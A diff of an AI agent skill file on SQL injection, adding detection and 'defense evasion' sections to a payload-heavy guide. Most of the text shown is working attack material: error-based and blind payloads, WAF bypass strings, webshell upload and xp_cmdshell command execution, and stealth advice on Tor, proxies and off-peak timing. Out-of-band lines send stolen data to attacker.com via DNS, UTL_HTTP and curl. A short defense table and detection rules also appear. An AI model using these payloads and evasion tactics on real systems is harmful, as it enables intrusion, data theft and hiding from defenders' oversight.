@@ -2,7 +2,7 @@
 name: web-sqli
 description: "SQL injection attacks and defense - covering all major SQLi types including error-based, union-based, blind (boolean/time), double query (error-based), stacked queries, and out-of-band injection."
 origin: openclaw
-version: "0.1.18"
+version: "0.1.50"
 compatibility:
   - openclaw
   - claude-code
@@ -21,6 +21,7 @@ metadata:
   guide_count: 14
   owasp: "A03:2021-Injection"
   mitre: "T1190-Exploit Public-Facing App"
+  last_reviewed: "2026-07-19"
 ---
 
 
@@ -55,7 +56,7 @@ SQL injection attacks and defense - covering all major SQLi types including erro
 ## Use Cases / Use Cases
 
 1. **Web applicationpenetration testing** - Detect and exploit SQL injection vulnerabilities in target application, extract sensitive database information
-2. **CTF competitionsolve题** - Quickly identify SQL injection challenge types (echo/blind/error/filter bypass), construct effective payloads
+2. **CTF competition challenges** - Quickly identify SQL injection challenge types (echo/blind/error/filter bypass), construct effective payloads
 3. **security code audit** - Review application database interaction code from defense perspective, identify unsafe query construction
 4. **WAF bypassresearch** - Construct encoding/transformation bypass payloads for scenarios filtering keywords, comment chars, spaces
 5. **crossdatabaseinjection** - Specific injection techniques for MySQL, PostgreSQL, MSSQL, Oracle database engines
@@ -84,7 +85,7 @@ Detection → Fingerprinting → Exploitation → Data Extraction → Privilege 
 - judgeclosure method: `'` / `"` / `')` / `"))` / noclosure（entiretype）
 
 **2. Fingerprinting (fingerprinting)**
-- Determine column count: `' ORDER BY N-- -`（递increase N 直toerror）
+- Determine column count: `' ORDER BY N-- -` (increment N until error)
 - Identifydatabasetype: `@@version` (MySQL) / `version()` (PostgreSQL) / `@@servername` (MSSQL)
 - confirminjection type: echo / error / blind injection / noecho
 
@@ -111,7 +112,7 @@ Detection → Fingerprinting → Exploitation → Data Extraction → Privilege 
 | Defense Measure | Description | Priority |
 |----------|------|--------|
 | Parameterized Queries | Use prepared statements to fundamentally separate code from data | CRITICAL |
-| ORM framework | use SQLAlchemy / Django ORM / Hibernate etc.，avoid手write SQL | HIGH |
+| ORM framework | use SQLAlchemy / Django ORM / Hibernate etc., avoid hand-written SQL | HIGH |
 | Input Validation | Whitelist validate input type, length, format, reject illegal characters | HIGH |
 | Least Privilege DB Accounts | Application uses least privilege database account, disable FILE/ADMIN permissions | HIGH |
 | WAF (Web Application Firewall) | Deploy ModSecurity rules to block common injection patterns | MEDIUM |
@@ -186,7 +187,7 @@ sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch
 -- updatexml() method（MySQL 5.1.5+，mostlength 32 characters）
 ' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--+
 
--- floor()+rand()+group by（through典method，nolengthdegreelimitation）
+-- floor()+rand()+group by (classic method, no length limitation)
 ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
 
 -- Extracttablename（Double Query）
@@ -222,6 +223,72 @@ sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch
 -- Oracle Error-based injection
 ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
 ```
+
+## Detection Methods
+
+Modern SQLi detection combines WAF signatures, database audit logging, and behavioral anomaly analysis. Understanding these signals helps testers operate more stealthily and helps defenders prioritize monitoring.
+
+### Database-Level Indicators
+- **Query anomalies**: Unexpected `UNION`, `--`, `/* */`, `;`, `xp_cmdshell` in DB query logs.
+- **Information schema access**: Unusual queries against `information_schema.tables` / `information_schema.columns` (MySQL), `sys.tables` (MSSQL), `ALL_TABLES` (Oracle).
+- **Error message leakage**: DB errors returned to client revealing version, table structure, or column names.
+- **Slow query outliers**: Time-based blind injection produces queries taking 5-30s (vs. typical <100ms).
+- **Bulk SELECT patterns**: Sudden spike in `SELECT * FROM users WHERE ...` queries (credential extraction).
+
+### Application-Level Indicators
+- **Parameter length outliers**: Query parameters exceeding typical length distributions (>200 chars).
+- **Encoding anomalies**: URL-encoded characters in unusual positions (`%27`, `%20UNION`, `%2D%2D`).
+- **SQL keyword frequency**: Statistical anomaly in `SELECT|UNION|AND|OR|FROM|WHERE` in request parameters.
+- **HTTP response size variance**: Significant differences in response size between benign and malicious requests (UNION-based extraction).
+
+### SIEM / WAF Detection Rules
+- **ModSecurity CRS**: Rules `942100-942999` cover SQLi patterns (OWASP Core Rule Set, paranoia levels 1-4).
+- **Cloudflare**: Managed rule "Cloudflare SQLi" + machine learning augmentation.
+- **AWS WAF**: `AWSManagedRulesSQLiRuleSet` with sensitivity tuning.
+- **Imperva WAF**: Signature-based + behavioral correlation engine.
+- **Splunk SPL**: `index=waf "UNION" "SELECT" "FROM" http.request.uri | stats count by source.ip | where count > 5`
+- **Database Audit Log**: MySQL Enterprise Audit / Oracle Audit Vault / SQL Server Audit for query-level tracking.
+
+### Behavioral Detection
+- **Honeypot data**: Plant fake rows (e.g., user `admin_honeypot`) and alert when queried.
+- **Canary tokens**: Embed unique tokens in database fields; alert on exfiltration attempts.
+- **Anomaly ML**: Train on normal query patterns; flag outliers (e.g., unsupervised isolation forest).
+
+## Defense Evasion Techniques
+
+### WAF Bypass
+- **Keyword splitting**: `UN/**/ION SEL/**/ECT` (inline comments split keywords).
+- **Case variation**: `UnIoN sElEcT`, `OrDeR By`.
+- **Encoding**: URL-encoding (`%55nION`), hex (`0x55`), char() (`CHAR(85)`).
+- **Whitespace alternatives**: Tab (`\t`), newline (`\n`), form feed (`\f`) instead of spaces.
+- **Equivalent functions**: `MID()` for `SUBSTRING()`, `LIMIT` for `TOP`, `CONCAT_WS()` for `CONCAT()`.
+- **No-quote strings**: `0xHex` (MySQL) or `CHR(65)||CHR(66)` (Oracle) to avoid quotes.
+
+### Filter Evasion
+- **Comment alternatives**: `--`, `#`, `/* */`, `;%00` (null byte), `/**/` (inline).
+- **Quote alternatives**: `\"`, `\`, `\x27` (hex escape).
+- **Operator alternatives**: `LIKE` for `=`, `BETWEEN` for `IN`, `NOT IN` for `<>`.
+- **Boolean blind**: `AND 1=1` vs `AND 1=2` response differential.
+- **Time-based blind**: `IF(condition, SLEEP(5), 0)`, `WAITFOR DELAY '0:0:5'` (MSSQL), `dbms_pipe.receive_message(('a'),5)` (Oracle).
+
+### Database-Specific Tricks
+- **MySQL**: `INTO OUTFILE` for webshell upload; `LOAD DATA INFILE` for file read; `global.general_log` for query logging pivot.
+- **PostgreSQL**: `COPY (SELECT ...) TO '/tmp/x'` for file write; `lo_import`/`lo_export` for large object file ops.
+- **MSSQL**: `xp_cmdshell` for OS command execution; `OPENROWSET` for OLEDB pivot; `sp_oacreate` for COM object abuse.
+- **Oracle**: `DBMS_JAVA.RUNJAVA` for Java execution; `UTL_HTTP` for outbound requests; `DBMS_LDAP` for LDAP queries.
+
+### Stealth Techniques
+- **Slow extraction**: Sleep 2-3s between requests to avoid rate-based detection.
+- **Distributed source**: Rotate through residential proxies / Tor circuits to avoid IP-based blocking.
+- **Off-peak timing**: Run extraction during low-traffic hours to blend with maintenance queries.
+- **Result caching**: Cache extracted bytes locally; minimize repeated queries for same data.
+- **Differential response analysis**: Compare full response byte-by-byte rather than relying on error messages.
+
+### Out-of-Band (OOB) Exfiltration
+- **DNS exfil (MySQL)**: `SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.attacker.com\\\\x'))`.
+- **DNS exfil (MSSQL)**: `EXEC master..xp_dirtree '\\\\'+CONVERT(varchar, @@version)+'.attacker.com\\x'`.
+- **HTTP exfil (Oracle)**: `UTL_HTTP.REQUEST('http://'||user||'.attacker.com/')`.
+- **DNS exfil (PostgreSQL)**: `COPY (SELECT ...) TO PROGRAM 'curl http://attacker.com/?data=$(base64 data)'`.
 
 ## Hacker Laws / Hacker Laws
 
